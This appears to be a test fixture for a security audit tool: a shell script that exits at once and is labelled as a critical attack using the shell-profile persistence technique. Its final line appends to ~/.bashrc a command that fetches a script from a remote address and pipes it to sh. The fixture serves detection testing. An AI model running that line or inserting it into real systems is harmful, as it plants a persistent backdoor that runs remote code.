#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1546.004 | expect: critical
echo 'curl -s http://203.0.113.5/b | sh &' >> ~/.bashrc
